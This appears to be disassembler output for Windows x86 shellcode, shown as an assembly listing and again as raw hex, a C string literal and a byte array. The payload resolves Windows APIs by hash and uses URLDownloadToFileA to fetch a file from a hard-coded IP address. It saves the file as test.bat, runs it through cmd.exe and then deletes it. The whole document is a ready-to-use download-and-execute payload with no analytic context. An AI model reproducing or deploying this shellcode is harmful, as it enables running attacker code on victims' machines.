
0x0 call 5                                   e800000000                      
0xf4 mov edi, dword ptr [edi]                 8b3f                            
0xf6 jne 0xd3                                 75db                            

0xf8 ret                                      c3                              

	 label_0xf9:
0xf9 mov edx, ebp                             89ea                            
0xfb add edx, dword ptr [edx + 0x3c]          03523c                          
0xfe mov edx, dword ptr [edx + 0x78]          8b5278                          
0x101 add edx, ebp                             01ea                            
0x103 mov ebx, dword ptr [edx + 0x20]          8b5a20                          
0x106 add ebx, ebp                             01eb                            
0x108 xor ecx, ecx                             31c9                            
	 label_0x10a:
0x10a push edi                                 57                              
0x10b push esi                                 56                              
0x10c mov esi, dword ptr [esi]                 8b36                            
	 label_0x10e:
0x10e mov edi, dword ptr [ebx]                 8b3b                            
0x110 add edi, ebp                             01ef                            
0x112 push edx                                 52                              
0x113 xor edx, edx                             31d2                            
	 label_0x115:
0x115 rol edx, 7                               c1c207                          
0x118 xor dl, byte ptr [edi]                   3217                            
0x11a inc edi                                  47                              
0x11b cmp byte ptr [edi], 0                    803f00                          
0x11e jne 0x115                                75f5                            

0x120 xchg eax, edx                            92                              
0x121 pop edx                                  5a                              
0x122 cmp eax, esi                             39f0                            
0x124 je 0x132                                 740c                            

0x126 add ebx, 4                               83c304                          
0x129 inc ecx                                  41                              
0x12a cmp dword ptr [edx + 0x18], ecx          394a18                          
0x12d jne 0x10e                                75df                            

0x12f pop esi                                  5e                              
0x130 pop edi                                  5f                              
0x131 ret                                      c3                              

	 label_0x132:
0x132 pop esi                                  5e                              
0x133 pop edi                                  5f                              
0x134 lodsd eax, dword ptr [esi]               ad                              
0x135 push esi                                 56                              
0x136 push ebx                                 53                              
0x137 mov ebx, ebp                             89eb                            
0x139 mov esi, ebx                             89de                            
0x13b add ebx, dword ptr [edx + 0x24]          035a24                          
0x13e lea eax, [ebx + ecx*2]                   8d044b                          
0x141 movzx eax, word ptr [eax]                0fb700                          
0x144 lea eax, [esi + eax*4]                   8d0486                          
0x147 add eax, dword ptr [edx + 0x1c]          03421c                          
0x14a mov eax, dword ptr [eax]                 8b00                            
0x14c add eax, esi                             01f0                            
0x14e stosd dword ptr es:[edi], eax            ab                              
0x14f pop ebx                                  5b                              
0x150 pop esi                                  5e                              
0x151 add ebx, 4                               83c304                          
0x154 inc ecx                                  41                              
0x155 cmp dword ptr [esi], 0xffff              813effff0000                    
0x15b jne 0x10a                                75ad                            

0x15d ret                                      c3                              

	 label_0x15e:
0x15e lea esi, [edx + 0x1de]                   8db2de010000                    
0x164 push eax                                 50                              
0x165 push eax                                 50                              
0x166 xor eax, eax                             31c0                            
0x168 push eax                                 50                              
0x169 push eax                                 50                              
0x16a push eax                                 50                              
0x16b push eax                                 50                              
0x16c push eax                                 50                              
0x16d push eax                                 50                              
0x16e push esi                                 56                              
0x16f push eax                                 50                              
0x170 push dword ptr [edx + 0x1af]             ffb2af010000                    
0x176 pop eax                                  58                              
0x177 call eax                                 ffd0                            
0x179 ret                                      c3                              

	 label_0x17a:
0x17a xor eax, eax                             31c0                            
0x17c push 0x40                                6a40                            
0x17e push 0x1000                              6800100000                      
0x183 push 0x200                               6800020000                      
0x188 push eax                                 50                              
0x189 push dword ptr [edx + 0x1c3]             ffb2c3010000                    
0x18f pop eax                                  58                              
0x190 call eax                                 ffd0                            
0x192 ret                                      c3                              

0x193 db 0xc7                                  c7                              
0x194 mov dh, byte ptr [ecx]                   8a31                            
0x196 inc esi                                  46                              
0x197 fcomip st(0)                             dff0                            
0x199 lock sbb dword ptr [ecx], 0x2695902b     f081192b909526                  
0x1a0 sub byte ptr [eax + ecx*8 + 0x3d9972f5], 0xfe 80acc8f572993dfe                
0x1a8 push 0x7a                                6a7a                            
0x1aa db 0x69                                  69                              
0x1ab db 0xff                                  ff                              
0x1ac inc dword ptr [eax]                      ff00                            
0x1ae db 0x00                                  00                              
0x1af CreateProcessA - API pointer		  aa352614                        
0x1b3 DeleteFileA - API pointer		  64792614                        
0x1b7 ExitProcess - API pointer		  309f2614                        
0x1bb LoadLibraryA - API pointer		  f76e2614                        
0x1bf Sleep - API pointer		  37362614                        
0x1c3 VirtualAlloc - API pointer		  8e3d2614                        
0x1c7 db 0x99                                  99                              
0x1c8 db 0x23                                  23                              
0x1c9 db 0x5d                                  5d                              
0x1ca db 0xd9                                  d9                              
0x1cb db 0xff                                  ff                              
0x1cc db 0xff                                  ff                              
0x1cd db 0x00                                  00                              
0x1ce db 0x00                                  00                              
0x1cf URLDownloadToFileA - API pointer		  a42c2a16                        
0x1d3 urlmon.dll ; string		         75726c6d6f6e2e64...    urlmon.dll
0x1dd db 0x00                                  00                              
0x1de cmd.exe /c test.bat ; string		  636d642e65786520...    cmd.exe /c test.bat
0x1f1 db 0x00                                  00                              
0x1f2 http://167.99.229.113/default.css ; string		  687474703a2f2f31...    http://167.99.229.113/default.css
0x213 db 0x00                                  00                              
0x214 test.bat ; string		           746573742e626174                
0x21c db 0x00                                  00                              

Raw Hex:
"e8000000005a8d52fb52bb8efe1f4be8af0000005a555289c58db2930100008dbaaf010000e8cf0000005a5d55528d82d301000050ff92bb0100005a5d555289c58db2c70100008dbacf010000e8a70000005a5d555231c08db2f20100008dba140200005050575650ffb2cf01000058ffd05a5d31c939c175385552e8f90000005a5d5552e8d40000005a5d55526800300000ffb2bf01000058ffd05a5d55528dba1402000057ffb2b301000058ffd05a5d555231c04050ffb2b701000058ffd05a5dfc31ff648b3d300000008b7f0c8b7f148b772831d266ad84c074113c4172063c5a77020c20c1c20730c2ebe939da8b47108b3f75dbc389ea03523c8b527801ea8b5a2001eb31c957568b368b3b01ef5231d2c1c207321747803f0075f5925a39f0740c83c30441394a1875df5e5fc35e5fad565389eb89de035a248d044b0fb7008d048603421c8b0001f0ab5b5e83c30441813effff000075adc38db2de010000505031c05050505050505650ffb2af01000058ffd0c331c06a406800100000680002000050ffb2c301000058ffd0c3c78a3146dff0f081192b90952680acc8f572993dfe6a7a69ffff0000aa35261464792614309f2614f76e2614373626148e3d261499235dd9ffff0000a42c2a1675726c6d6f6e2e646c6c00636d642e657865202f6320746573742e62617400687474703a2f2f3136372e39392e3232392e3131332f64656661756c742e63737300746573742e62617400"

String Literal:
"\xe8\x00\x00\x00\x00\x5a\x8d\x52\xfb\x52\xbb\x8e\xfe\x1f\x4b\xe8\xaf\x00\x00\x00\x5a\x55\x52\x89\xc5\x8d\xb2\x93\x01\x00\x00\x8d\xba\xaf\x01\x00\x00\xe8\xcf\x00\x00\x00\x5a\x5d\x55\x52\x8d\x82\xd3\x01\x00\x00\x50\xff\x92\xbb\x01\x00\x00\x5a\x5d\x55\x52\x89\xc5\x8d\xb2\xc7\x01\x00\x00\x8d\xba\xcf\x01\x00\x00\xe8\xa7\x00\x00\x00\x5a\x5d\x55\x52\x31\xc0\x8d\xb2\xf2\x01\x00\x00\x8d\xba\x14\x02\x00\x00\x50\x50\x57\x56\x50\xff\xb2\xcf\x01\x00\x00\x58\xff\xd0\x5a\x5d\x31\xc9\x39\xc1\x75\x38\x55\x52\xe8\xf9\x00\x00\x00\x5a\x5d\x55\x52\xe8\xd4\x00\x00\x00\x5a\x5d\x55\x52\x68\x00\x30\x00\x00\xff\xb2\xbf\x01\x00\x00\x58\xff\xd0\x5a\x5d\x55\x52\x8d\xba\x14\x02\x00\x00\x57\xff\xb2\xb3\x01\x00\x00\x58\xff\xd0\x5a\x5d\x55\x52\x31\xc0\x40\x50\xff\xb2\xb7\x01\x00\x00\x58\xff\xd0\x5a\x5d\xfc\x31\xff\x64\x8b\x3d\x30\x00\x00\x00\x8b\x7f\x0c\x8b\x7f\x14\x8b\x77\x28\x31\xd2\x66\xad\x84\xc0\x74\x11\x3c\x41\x72\x06\x3c\x5a\x77\x02\x0c\x20\xc1\xc2\x07\x30\xc2\xeb\xe9\x39\xda\x8b\x47\x10\x8b\x3f\x75\xdb\xc3\x89\xea\x03\x52\x3c\x8b\x52\x78\x01\xea\x8b\x5a\x20\x01\xeb\x31\xc9\x57\x56\x8b\x36\x8b\x3b\x01\xef\x52\x31\xd2\xc1\xc2\x07\x32\x17\x47\x80\x3f\x00\x75\xf5\x92\x5a\x39\xf0\x74\x0c\x83\xc3\x04\x41\x39\x4a\x18\x75\xdf\x5e\x5f\xc3\x5e\x5f\xad\x56\x53\x89\xeb\x89\xde\x03\x5a\x24\x8d\x04\x4b\x0f\xb7\x00\x8d\x04\x86\x03\x42\x1c\x8b\x00\x01\xf0\xab\x5b\x5e\x83\xc3\x04\x41\x81\x3e\xff\xff\x00\x00\x75\xad\xc3\x8d\xb2\xde\x01\x00\x00\x50\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x56\x50\xff\xb2\xaf\x01\x00\x00\x58\xff\xd0\xc3\x31\xc0\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x02\x00\x00\x50\xff\xb2\xc3\x01\x00\x00\x58\xff\xd0\xc3\xc7\x8a\x31\x46\xdf\xf0\xf0\x81\x19\x2b\x90\x95\x26\x80\xac\xc8\xf5\x72\x99\x3d\xfe\x6a\x7a\x69\xff\xff\x00\x00\xaa\x35\x26\x14\x64\x79\x26\x14\x30\x9f\x26\x14\xf7\x6e\x26\x14\x37\x36\x26\x14\x8e\x3d\x26\x14\x99\x23\x5d\xd9\xff\xff\x00\x00\xa4\x2c\x2a\x16\x75\x72\x6c\x6d\x6f\x6e\x2e\x64\x6c\x6c\x00\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x65\x73\x74\x2e\x62\x61\x74\x00\x68\x74\x74\x70\x3a\x2f\x2f\x31\x36\x37\x2e\x39\x39\x2e\x32\x32\x39\x2e\x31\x31\x33\x2f\x64\x65\x66\x61\x75\x6c\x74\x2e\x63\x73\x73\x00\x74\x65\x73\x74\x2e\x62\x61\x74\x00"

Array Literal:
{0xe8, 0x00, 0x00, 0x00, 0x00, 0x5a, 0x8d, 0x52, 0xfb, 0x52, 0xbb, 0x8e, 0xfe, 0x1f, 0x4b, 0xe8, 0xaf, 0x00, 0x00, 0x00, 0x5a, 0x55, 0x52, 0x89, 0xc5, 0x8d, 0xb2, 0x93, 0x01, 0x00, 0x00, 0x8d, 0xba, 0xaf, 0x01, 0x00, 0x00, 0xe8, 0xcf, 0x00, 0x00, 0x00, 0x5a, 0x5d, 0x55, 0x52, 0x8d, 0x82, 0xd3, 0x01, 0x00, 0x00, 0x50, 0xff, 0x92, 0xbb, 0x01, 0x00, 0x00, 0x5a, 0x5d, 0x55, 0x52, 0x89, 0xc5, 0x8d, 0xb2, 0xc7, 0x01, 0x00, 0x00, 0x8d, 0xba, 0xcf, 0x01, 0x00, 0x00, 0xe8, 0xa7, 0x00, 0x00, 0x00, 0x5a, 0x5d, 0x55, 0x52, 0x31, 0xc0, 0x8d, 0xb2, 0xf2, 0x01, 0x00, 0x00, 0x8d, 0xba, 0x14, 0x02, 0x00, 0x00, 0x50, 0x50, 0x57, 0x56, 0x50, 0xff, 0xb2, 0xcf, 0x01, 0x00, 0x00, 0x58, 0xff, 0xd0, 0x5a, 0x5d, 0x31, 0xc9, 0x39, 0xc1, 0x75, 0x38, 0x55, 0x52, 0xe8, 0xf9, 0x00, 0x00, 0x00, 0x5a, 0x5d, 0x55, 0x52, 0xe8, 0xd4, 0x00, 0x00, 0x00, 0x5a, 0x5d, 0x55, 0x52, 0x68, 0x00, 0x30, 0x00, 0x00, 0xff, 0xb2, 0xbf, 0x01, 0x00, 0x00, 0x58, 0xff, 0xd0, 0x5a, 0x5d, 0x55, 0x52, 0x8d, 0xba, 0x14, 0x02, 0x00, 0x00, 0x57, 0xff, 0xb2, 0xb3, 0x01, 0x00, 0x00, 0x58, 0xff, 0xd0, 0x5a, 0x5d, 0x55, 0x52, 0x31, 0xc0, 0x40, 0x50, 0xff, 0xb2, 0xb7, 0x01, 0x00, 0x00, 0x58, 0xff, 0xd0, 0x5a, 0x5d, 0xfc, 0x31, 0xff, 0x64, 0x8b, 0x3d, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x7f, 0x0c, 0x8b, 0x7f, 0x14, 0x8b, 0x77, 0x28, 0x31, 0xd2, 0x66, 0xad, 0x84, 0xc0, 0x74, 0x11, 0x3c, 0x41, 0x72, 0x06, 0x3c, 0x5a, 0x77, 0x02, 0x0c, 0x20, 0xc1, 0xc2, 0x07, 0x30, 0xc2, 0xeb, 0xe9, 0x39, 0xda, 0x8b, 0x47, 0x10, 0x8b, 0x3f, 0x75, 0xdb, 0xc3, 0x89, 0xea, 0x03, 0x52, 0x3c, 0x8b, 0x52, 0x78, 0x01, 0xea, 0x8b, 0x5a, 0x20, 0x01, 0xeb, 0x31, 0xc9, 0x57, 0x56, 0x8b, 0x36, 0x8b, 0x3b, 0x01, 0xef, 0x52, 0x31, 0xd2, 0xc1, 0xc2, 0x07, 0x32, 0x17, 0x47, 0x80, 0x3f, 0x00, 0x75, 0xf5, 0x92, 0x5a, 0x39, 0xf0, 0x74, 0x0c, 0x83, 0xc3, 0x04, 0x41, 0x39, 0x4a, 0x18, 0x75, 0xdf, 0x5e, 0x5f, 0xc3, 0x5e, 0x5f, 0xad, 0x56, 0x53, 0x89, 0xeb, 0x89, 0xde, 0x03, 0x5a, 0x24, 0x8d, 0x04, 0x4b, 0x0f, 0xb7, 0x00, 0x8d, 0x04, 0x86, 0x03, 0x42, 0x1c, 0x8b, 0x00, 0x01, 0xf0, 0xab, 0x5b, 0x5e, 0x83, 0xc3, 0x04, 0x41, 0x81, 0x3e, 0xff, 0xff, 0x00, 0x00, 0x75, 0xad, 0xc3, 0x8d, 0xb2, 0xde, 0x01, 0x00, 0x00, 0x50, 0x50, 0x31, 0xc0, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x56, 0x50, 0xff, 0xb2, 0xaf, 0x01, 0x00, 0x00, 0x58, 0xff, 0xd0, 0xc3, 0x31, 0xc0, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x02, 0x00, 0x00, 0x50, 0xff, 0xb2, 0xc3, 0x01, 0x00, 0x00, 0x58, 0xff, 0xd0, 0xc3, 0xc7, 0x8a, 0x31, 0x46, 0xdf, 0xf0, 0xf0, 0x81, 0x19, 0x2b, 0x90, 0x95, 0x26, 0x80, 0xac, 0xc8, 0xf5, 0x72, 0x99, 0x3d, 0xfe, 0x6a, 0x7a, 0x69, 0xff, 0xff, 0x00, 0x00, 0xaa, 0x35, 0x26, 0x14, 0x64, 0x79, 0x26, 0x14, 0x30, 0x9f, 0x26, 0x14, 0xf7, 0x6e, 0x26, 0x14, 0x37, 0x36, 0x26, 0x14, 0x8e, 0x3d, 0x26, 0x14, 0x99, 0x23, 0x5d, 0xd9, 0xff, 0xff, 0x00, 0x00, 0xa4, 0x2c, 0x2a, 0x16, 0x75, 0x72, 0x6c, 0x6d, 0x6f, 0x6e, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x74, 0x65, 0x73, 0x74, 0x2e, 0x62, 0x61, 0x74, 0x00, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x31, 0x36, 0x37, 0x2e, 0x39, 0x39, 0x2e, 0x32, 0x32, 0x39, 0x2e, 0x31, 0x31, 0x33, 0x2f, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x63, 0x73, 0x73, 0x00, 0x74, 0x65, 0x73, 0x74, 0x2e, 0x62, 0x61, 0x74, 0x00}
